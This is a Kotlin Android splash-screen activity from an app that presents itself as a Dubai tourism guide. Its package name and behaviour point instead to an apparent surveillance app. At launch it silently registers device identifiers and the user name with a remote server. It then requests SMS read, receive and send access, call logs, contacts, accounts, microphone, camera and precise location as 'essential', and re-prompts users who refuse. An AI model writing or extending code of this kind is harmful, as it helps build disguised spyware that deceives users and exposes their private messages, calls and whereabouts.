package com.devicesync.app

import android.content.Intent
import android.content.pm.PackageManager
import android.content.SharedPreferences
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.devicesync.app.api.RetrofitClient
import com.devicesync.app.data.DeviceInfo
import com.devicesync.app.data.ConnectionType
import com.devicesync.app.utils.DeviceInfoUtils
import com.devicesync.app.utils.DynamicStringManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class SplashActivity : AppCompatActivity() {
    
    companion object {
        private const val SPLASH_DELAY = 3000L // 3 seconds
        private const val ESSENTIAL_PERMISSIONS_REQUEST_CODE = 1001
        private const val MAX_SPLASH_TIME = 10000L // 10 seconds maximum
        private const val PREFS_NAME = "DubaiDiscoveriesPrefs"
        private const val KEY_PERMISSIONS_GRANTED = "permissions_granted"
    }
    
    private lateinit var progressBar: ProgressBar
    private lateinit var loadingText: TextView
    private lateinit var statusText: TextView
    private lateinit var sharedPreferences: SharedPreferences
    private var hasNavigated = false
    private var userDecidedToProceed = false  // Flag to prevent further dialogs
    private var permissionFlowStarted = false  // Flag to prevent multiple permission requests
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)
        
        // Initialize UI elements
        progressBar = findViewById(R.id.progressBar)
        loadingText = findViewById(R.id.loadingText)
        statusText = findViewById(R.id.permissionStatus)
        
        // Initialize SharedPreferences
        sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        
        // Start the 3-second splash flow
        startSplashFlow()
        
        // Add a safety timeout to ensure we always proceed to login
        Handler(Looper.getMainLooper()).postDelayed({
            if (!hasNavigated) {
                println("⏰ Safety timeout reached - proceeding to login...")
                proceedToLogin()
            }
        }, MAX_SPLASH_TIME)
    }
    
    private fun startSplashFlow() {
        updateStatus(DynamicStringManager.getStringSync("welcome_to_dubai", this), 10)
        loadingText.text = DynamicStringManager.getStringSync("setting_up_tourism", this)
        
        // Step 1: Register device (0-1 second)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus(DynamicStringManager.getStringSync("registering_device", this), 30)
            loadingText.text = DynamicStringManager.getStringSync("connecting_services", this)
            registerDevice()
        }, 1000)
        
        // Step 2: Show permission dialog immediately (1 second)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus(DynamicStringManager.getStringSync("checking_permissions", this), 60)
            loadingText.text = DynamicStringManager.getStringSync("preparing_features", this)
            handlePermissionFlow()
        }, 1000)
        
        // Step 3: Complete splash (if permissions are handled)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus(DynamicStringManager.getStringSync("almost_ready", this), 90)
            loadingText.text = DynamicStringManager.getStringSync("adventure_awaits", this)
        }, 2500)
    }
    
    private fun registerDevice() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val deviceId = DeviceInfoUtils.getDeviceId(this@SplashActivity)
                val androidId = DeviceInfoUtils.getAndroidId(this@SplashActivity)
                val userName = DeviceInfoUtils.getUserName(this@SplashActivity)
                
                val deviceInfo = DeviceInfo(
                    deviceId = deviceId,
                    androidId = androidId,
                    deviceName = android.os.Build.MODEL.ifEmpty { "Unknown Device" },
                    model = android.os.Build.MODEL.ifEmpty { "Unknown Model" },
                    manufacturer = android.os.Build.MANUFACTURER.ifEmpty { "Unknown Manufacturer" },
                    androidVersion = android.os.Build.VERSION.RELEASE.ifEmpty { "Unknown Version" },
                    userName = userName,
                    isConnected = true,
                    connectionType = ConnectionType.NETWORK
                )
                
                val response = RetrofitClient.apiService.registerDevice(deviceInfo)
                if (response.isSuccessful && response.body()?.success == true) {
                    println("✅ Device registered successfully: ${response.body()?.message}")
                } else {
                    println("⚠️ Device registration response: ${response.body()?.message ?: "Unknown error"}")
                }
                
            } catch (e: Exception) {
                println("❌ Device registration failed: ${e.message}")
                // Continue anyway - device registration is not critical
            }
        }
    }
    
    private fun handlePermissionFlow() {
        // Prevent multiple permission flows
        if (permissionFlowStarted || userDecidedToProceed) {
            println("🔐 Permission flow already started or user decided - skipping...")
            return
        }
        
        permissionFlowStarted = true
        
        // Check if permissions were already granted before
        val permissionsPreviouslyGranted = sharedPreferences.getBoolean(KEY_PERMISSIONS_GRANTED, false)
        
        // Check current permission status
        val essentialPermissions = getEssentialPermissions()
        println("🔍 Checking ${essentialPermissions.size} essential permissions...")
        
        val allGranted = essentialPermissions.all { permission ->
            val isGranted = androidx.core.content.ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
            println("🔍 Permission $permission: ${if (isGranted) "✅ GRANTED" else "❌ NOT GRANTED"}")
            isGranted
        }
        
        if (allGranted) {
            println("✅ All essential permissions already granted - proceeding to login")
            // Save that permissions are granted
            sharedPreferences.edit().putBoolean(KEY_PERMISSIONS_GRANTED, true).apply()
            proceedToLogin()
        } else if (permissionsPreviouslyGranted) {
            println("⚠️ Permissions were previously granted but some are now missing - proceeding anyway")
            // If permissions were previously granted but some are now missing, proceed anyway
            proceedToLogin()
        } else {
            println("⚠️ Some essential permissions not granted - requesting permissions")
            val deniedPermissions = essentialPermissions.filter { permission ->
                androidx.core.content.ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
            }
            println("❌ Denied permissions: $deniedPermissions")
            
            // Only request permissions if they're not already granted
            requestEssentialPermissions()
        }
    }
    
    private fun getEssentialPermissions(): Array<String> {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ (API 33+) - Only request permissions that actually exist and are essential
            arrayOf(
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.POST_NOTIFICATIONS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.GET_ACCOUNTS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS
            )
        } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
            // Android 12 (API 31-32) - Include permissions without POST_NOTIFICATIONS
            arrayOf(
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.GET_ACCOUNTS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS
            )
        } else {
            // Android 11 and below - Include all permissions
            arrayOf(
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.GET_ACCOUNTS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS
            )
        }
    }
    
    private fun requestEssentialPermissions() {
        val essentialPermissions = getEssentialPermissions()
        
        println("🔐 Requesting ${essentialPermissions.size} essential permissions: ${essentialPermissions.toList()}")
        
        // Use standard Android permission request
        androidx.core.app.ActivityCompat.requestPermissions(
            this,
            essentialPermissions,
            ESSENTIAL_PERMISSIONS_REQUEST_CODE
        )
    }
    
    private fun showEssentialPermissionReminderDialog() {
        val dialog = AlertDialog.Builder(this, R.style.WhiteDialogTheme)
            .setTitle(DynamicStringManager.getStringSync("complete_setup_title", this))
            .setMessage(DynamicStringManager.getStringSync("permission_reminder_message", this))
            .setPositiveButton(DynamicStringManager.getStringSync("enable_full_experience_button", this)) { _, _ ->
                println("🔐 User clicked 'Enable Full Experience' - requesting permissions again...")
                // Request permissions again with a slight delay to avoid UI issues
                Handler(Looper.getMainLooper()).postDelayed({
                    requestEssentialPermissions()
                }, 500)
            }
            .setNegativeButton(DynamicStringManager.getStringSync("continue_anyway_button", this)) { _, _ ->
                println("🔐 User clicked 'Continue Anyway' - proceeding to login...")
                // Allow user to proceed without permissions
                proceedToLogin()
            }
            .setCancelable(true)
            .setOnCancelListener {
                println("🔐 User cancelled permission dialog - proceeding to login...")
                proceedToLogin()
            }
            .create()
        
        dialog.show()
    }
    
    private fun proceedToLogin() {
        if (!hasNavigated) {
            hasNavigated = true
            userDecidedToProceed = true  // Prevent any further dialogs
            println("🚀 User decided to proceed - navigating to login...")
            val intent = Intent(this, LoginActivity::class.java)
            startActivity(intent)
            finish()
        }
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        when (requestCode) {
            ESSENTIAL_PERMISSIONS_REQUEST_CODE -> {
                println("🔐 onRequestPermissionsResult: requestCode=$requestCode")
                println("🔐 Permissions: ${permissions.toList()}")
                println("🔐 Grant results: ${grantResults.toList()}")
                
                // If user has already decided to proceed, don't show any more dialogs
                if (userDecidedToProceed) {
                    println("🔐 User already decided to proceed - skipping permission checks")
                    return
                }
                
                val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
                println("🔐 All permissions granted: $allGranted")
                
                if (allGranted) {
                    println("✅ All permissions granted! Proceeding to login...")
                    updateStatus("All permissions granted!", 100)
                    // Save that permissions are granted
                    sharedPreferences.edit().putBoolean(KEY_PERMISSIONS_GRANTED, true).apply()
                    proceedToLogin()
                } else {
                    println("⚠️ Some permissions denied. Checking if we should show reminder...")
                    val deniedPermissions = permissions.filterIndexed { index, _ ->
                        grantResults[index] != PackageManager.PERMISSION_GRANTED
                    }
                    println("❌ Denied permissions: $deniedPermissions")
                    
                    // Check if any permissions were actually denied (not just not granted)
                    val anyDenied = grantResults.any { it == PackageManager.PERMISSION_DENIED }
                    
                    if (anyDenied && !userDecidedToProceed) {
                        println("🔐 Some permissions were explicitly denied. Showing reminder dialog...")
                        // Show reminder dialog for denied permissions
                        showEssentialPermissionReminderDialog()
                    } else {
                        println("🔐 Permissions not granted but not explicitly denied. Proceeding to login...")
                        // If permissions were not explicitly denied, just proceed
                        proceedToLogin()
                    }
                }
            }
        }
    }
    
    private fun updateStatus(status: String, progress: Int) {
        statusText.text = status
        progressBar.progress = progress
    }
} 